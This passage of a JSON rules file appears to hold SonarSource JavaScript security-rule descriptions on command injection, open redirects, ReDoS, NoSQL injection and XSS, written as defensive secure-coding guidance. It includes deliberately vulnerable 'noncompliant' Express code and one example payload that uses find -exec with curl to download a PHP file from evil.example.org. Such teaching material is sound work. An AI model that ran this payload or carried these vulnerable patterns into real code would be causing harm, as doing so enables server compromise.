protects it while in transit from one host to another. It provides authenticity and\nintegrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The artifact is a file intended to execute code. </li>\n  <li> The artifact is a file that is intended to configure or affect running code in some way. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified\nsince the fingerprint was computed.</p>\n<p>In this case, the artifact’s hash must:</p>\n<ul>\n  <li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li>\n  <li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li>\n</ul>\n<p>To do so, the best option is to add the hash in the code explicitly, by following <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes\">Mozilla’s official documentation on\nhow to generate integrity strings</a>.</p>\n<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named \"latest\" or similar, so that the\nfront-end pages do not break when the code of the latest remote artifact changes.</strong></p>\n<h2>Sensitive Code Example</h2>\n<p>The following code sample uses neither integrity checks nor version pinning:</p>\n<pre>\n&lt;script\n    src=\"https://cdn.example.com/latest/script.js\"\n&gt;&lt;/script&gt; &lt;!-- Sensitive --&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;script\n    src=\"https://cdn.example.com/v5.3.6/script.js\"\n    integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n&gt;&lt;/script&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/353\">CWE-353 - Missing Support for Integrity Check</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity\">developer.mozilla.org</a> - Subresource Integrity </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Watering_hole_attack\">Wikipedia, Watering Hole Attacks</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "jssecurity:S2631": {
        "name": "Regular expressions should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>\n<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this\ncan lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to make the affected component inaccessible.</p>\n<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Self Denial of Service</h4>\n<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)\ncan trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>\n<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>\n<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service might only affect the attacker who initiated it.</p>\n<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems\nwould detect the failure of a container and automatically replace it.</p>\n<h4>Infrastructure SPOFs</h4>\n<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture\nvulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient\ncontainer creation capabilities or failures from containers to terminate).</p>\n<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge\noffensive infrastructures.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without\nprior sanitization or validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst express = require('express');\n\nconst app = express();\n\napp.get('/lookup', (req, res) =&gt; {\n  const regex = RegExp(req.query.regex); // Noncompliant\n\n  if(regex.test(req.query.data)){\n    res.send(\"It's a Match!\");\n  }else{\n    res.send(\"Not a Match!\");\n  }\n})\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst express = require('express');\nconst escapeStringRegexp = require('escape-string-regexp');\n\nconst app = express();\n\napp.get('/lookup', (req, res) =&gt; {\n  const regex = RegExp(escapeStringRegexp(req.query.regex));\n\n  if(regex.test(req.query.data)){\n    res.send(\"It's a Match!\");\n  }else{\n    res.send(\"Not a Match!\");\n  }\n})\n</pre>\n<h3>How does this work?</h3>\n<h4>Sanitization and Validation</h4>\n<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular\nexpression engine interprets these characters literally.</p>\n<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>\nIf a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>\n<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>\n<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href=\"https://github.com/google/re2\">re2</a>.</p>\n<p>In the compliant solution, the <code>escapeStringRegexp</code> function provided by the npm package <code>escape-string-regexp</code> escapes\nmetacharacters and escape sequences that could have broken the initially intended logic.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">OWASP Regular expression Denial of Service - ReDoS</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "jssecurity:S5146": {
        "name": "HTTP request redirections should not be open to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>\n<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker\nto build a credible pretext to prevent suspicions from the victim.<br></p>\n<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>\n<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Domain Mirroring</h4>\n<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the\nsimilarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a\nmalicious domain.<br></p>\n<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any\nauthenticated data or action.</p>\n<h4>Malware Distribution</h4>\n<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the\nattacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a\nhosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>\n<h2>How to fix it in Express.js</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nserver.get('/redirect', (request, response) =&gt; {\n\n   response.redirect(request.query.url); // Noncompliant\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nserver.get('/redirect', (request, response) =&gt; {\n\n   if (request.query.url.startsWith(\"https://www.example.com/\")) {\n      response.redirect(request.query.url);\n   }\n});\n</pre>\n<h3>How does this work?</h3>\n<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in\nmethods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following\nalternatives:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>\n  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like\nexisting domains is widespread and is called <a href=\"https://en.wikipedia.org/wiki/Cybersquatting\">Cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S5883": {
        "name": "OS commands should not be vulnerable to argument injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data\nis limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the\nbehavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The\nsecurity of the application depends on the behavior of the application that is executed.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the\ncommand the parameters are added to, this might lead to arbitrary command execution.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Express.js</h2>\n<h3>Code examples</h3>\n<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>\n<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or\nsanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected\nsystem command behavior.</p>\n<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the\nfollowing payload will download malicious software on the application’s hosting server.</p>\n<pre>\n -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nasync function (req, res) {\n    await execa.command('find /tmp/images/' + req.query.id); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nasync function (req, res) {\n    if (req.query.file &amp;&amp; req.query.file.match(/^[A-Z]+$/i)) {\n        await execa('find', ['/tmp/images/' + req.query.file]);\n    } else {\n        await execa('find', ['/tmp/images/']);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid\nusing OS commands in the first place.</p>\n<p>When this is not possible, strict measures should be applied to ensure a secure implementation.</p>\n<p>The proposed compliant solution makes use of the <code>execa</code> method. This one separates the command to run from the arguments passed to it.\nIt also ensures that all arguments passed to the executed command are properly escaped. That way, an attacker with control over a command parameter\nwill not be able to inject arbitrary new ones.</p>\n<p>While this reduces the chances for an attacker to identify an exploitation payload, the highest security level will only be reached by adding an\nadditional validation layer.</p>\n<p>In the current example, an attacker with control over the first parameter of the <code>find</code> command could still be able to inject special\nfile path characters in it. Indeed, passing <code>../../</code> string as a parameter would force the <code>find</code> command to crawl the whole\nfile system. This could lead to a denial of service or sensitive data exposure.</p>\n<p>Here, adding a regular-expression-based validation on the user-controled value prevents this kind of issue. It ensures that the user-submitted\nparameter contains a harmless value.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheat Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "jssecurity:S2076": {
        "name": "OS commands should not be vulnerable to command injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,\nan attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the\nunderlying operating system.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can\nexecute an arbitrary program that is installed on the system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst { execSync } = require('child_process')\n\ncmd = req.query.cmd\nexecSync(cmd) // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst { spawnSync } = require('child_process')\n\nconst cmdId = parseInt(req.query.cmdId)\nlet host = req.query.host\nhost = typeof host === \"string\"? host : \"example.org\"\n\nconst allowedCommands = [\n    {exe:\"/bin/ping\", args:[\"-c\",\"1\",\"--\"]},\n    {exe:\"/bin/host\", args:[\"--\"]}\n]\nconst cmd = allowedCommands[cmdId]\nspawnSync(cmd.exe, cmd.args.concat(host))\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to\navoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some\nsecurity suggestions.</p>\n<h4>Pre-Approved commands</h4>\n<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the\ncleanest way to avoid this problem is to validate the input before using it in an OS command.</p>\n<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>\nIf a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use\nregexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using\n<code>^/bin/(ls|pwd|grep)$</code>.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<p>In the example compliant code, a static list of trusted commands is used. Users are only allowed to submit an index in this array in place of a\nfull command name.</p>\n<h4>Neutralize special characters</h4>\n<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special\nsanitization components, such as <code>child_process.spawn</code>.</p>\n<p>The library helps you to get rid of common dangerous characters, such as:</p>\n<ul>\n  <li> <code>&amp;</code> </li>\n  <li> <code>|</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>$</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>`</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>!</code> </li>\n</ul>\n<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are\nneutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>\n<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be\nterminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a\nhref=\"https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits\">since its version 2.24</a>.</p>\n<p>In the example compliant code, the <code>spawn</code> function from <code>child_process</code> is used in place of its less secure\n<code>exec</code> counterpart. It accepts command arguments as an array and performs a proper escaping of its element before building the command line\nto run.</p>\n<h4>Disable shell integration</h4>\n<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>\n<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system\nshell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be\nused to break out of a command call.</p>\n<p>Therefore, it is generally preferable to disable shell integration.</p>\n<p>The <code>spawn</code> function that is used in the example compliant code disables shell integration by default.</p>\n<h3>Pitfalls</h3>\n<h4>Loose typing</h4>\n<p>Because JavaScript is a loosely typed language, extra care should be taken when accepting user-controlled parameters. Indeed, some methods, that\ncan be used to sanitize untrusted parameters, sometimes accept both objects and object arrays.</p>\n<p>For example, the <code>Array.concat</code> function accepts an array as argument and will append all of its elements to its target. When an\nuntrusted parameter is an array, while a single string was expected, using <code>concat</code> to build a command argument list can result in an\narbitrary argument injection.</p>\n<p>It is therefore of prime importance to check the type of untrusted parameters before processing them.</p>\n<p>In the above compliant code example, the ambiguous <code>concat</code> function is used. However, a type check has been introduced to prevent any\nunexpected issue.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheaty Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S5147": {
        "name": "NoSQL operations should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into\nthe vulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data leakage</h4>\n<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more\ndatabases.<br> This threat is the most widespread impact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>\n<h4>Chaining NoSQL injections with other vulnerabilities</h4>\n<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>\n</ul>\n<h2>How to fix it in MongoDB</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a NoSQL injection because the database query is built using untrusted JavaScript objects that are extracted\nfrom user inputs.</p>\n<p>Here the application assumes the user-submitted parameters are always strings, while they might contain more complex structures. An array or\ndictionary input might tamper with the expected query behavior.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst { MongoClient } = require('mongodb');\n\nfunction (req, res) {\n    let query = { user: req.query.user, city: req.query.city };\n\n    MongoClient.connect(url, (err, db) =&gt; {\n        db.collection(\"users\")\n        .find(query) // Noncompliant\n        .toArray((err, docs) =&gt; { });\n    });\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst { MongoClient } = require('mongodb');\n\nfunction (req, res) {\n    let query = { user: req.query.user.toString(), city: req.query.city.toString() };\n\n    MongoClient.connect(url, (err, db) =&gt; {\n        db.collection(\"users\")\n        .find(query)\n        .toArray((err, docs) =&gt; { });\n    });\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use only plain string values</h4>\n<p>With MongoDB, NoSQL injection can arise when attackers are able to inject objects in the query instead of plain string values. For example, using\nthe object <code>{ $ne: \"\" }</code> in a field of a <code>find</code> query, will return every entry where the field is not empty.</p>\n<p>Some JavaScript application servers enable \"extended\" syntax that serializes URL query parameters into JavaScript objects or arrays. This allows\nattackers to control all the fields of an object. In express.js, this \"extended\" syntax <a\nhref=\"https://expressjs.com/en/4x/api.html#express.urlencoded\">is enabled by default</a>.</p>\n<p>Before using any untrusted value in a MongoDB query, make sure it is a plain string and not a JavaScript object or an array.</p>\n<p>In some cases, this will not be enough to protect against all attacks and strict validation needs to be applied (see the \"Pitfalls\" section)</p>\n<h3>Pitfalls</h3>\n<h4>Code execution</h4>\n<p>When untrusted data is used within query operators such as <code>$where</code>, <code>$accumulator</code>, or <code>$function</code> it usually\nresults in JavaScript code execution vulnerabilities.</p>\n<p>Therefore, untrusted values should not be used inside these query operators unless they are properly validated.</p>\n<p>For more information about MongoDB code execution vulnerabilities, see rule <a href='/coding_rules#rule_key=typescript%3AS5334'>S5334</a>.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/nosql-injections-in-rocket-chat/\">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/943\">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S5696": {
        "name": "DOM updates should not lead to cross-site scripting (XSS) attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>DOM-based cross-site scripting (XSS) occurs in a web application when its client-side logic reads user-controllable data, such as the URL, and then\nuses this data in dangerous functions defined by the browser, such as <code>eval()</code>, without sanitizing it first.</p>\n<p>When well-intentioned users open a link to a page vulnerable to DOM-based XSS, they are exposed to several attacks targeting their browsers.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but also arbitrary code that can\nbe interpreted by the user’s browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting this vulnerability.</p>\n<h4>Website defacement</h4>\n<p>An attacker can use the vulnerability to change the target web application’s content as they see fit. Therefore, they might replace the website’s\noriginal content with inappropriate content, leading to brand and reputation damage for the web application owner. It could additionally be used in\nphishing campaigns, leading to the potential loss of user credentials.</p>\n<h4>User impersonation</h4>\n<p>When a user is logged into a web application and opens a malicious link, the attacker can steal that user’s web session and carry out unauthorized\nactions on their account. If the credentials of a privileged user (such as an administrator) are stolen, the attacker might be able to compromise all\nof the web application’s data.</p>\n<h4>Theft of sensitive data</h4>\n<p>Cross-site scripting allows an attacker to extract the application data of any user that opens their malicious link. Depending on the application,\nthis can include sensitive data such as financial or health information. Furthermore, by injecting malicious code into the web application, it might\nbe possible to record keyboard activity (keylogger) or even request access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers can use cross-site scripting vulnerabilities as a first step to exploit more dangerous\nvulnerabilities.</p>\n<p>For example, suppose that the admin control panel of a web application contains an SQL injection vulnerability. In this case, an attacker could\nfind an XSS vulnerability and send a malicious link to an administrator. Once the administrator opens the link, the SQL injection is exploited, giving\nthe attacker access to all user data stored in the web application.</p>\n<h2>How to fix it in DOM API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to DOM-based cross-site scripting because it uses 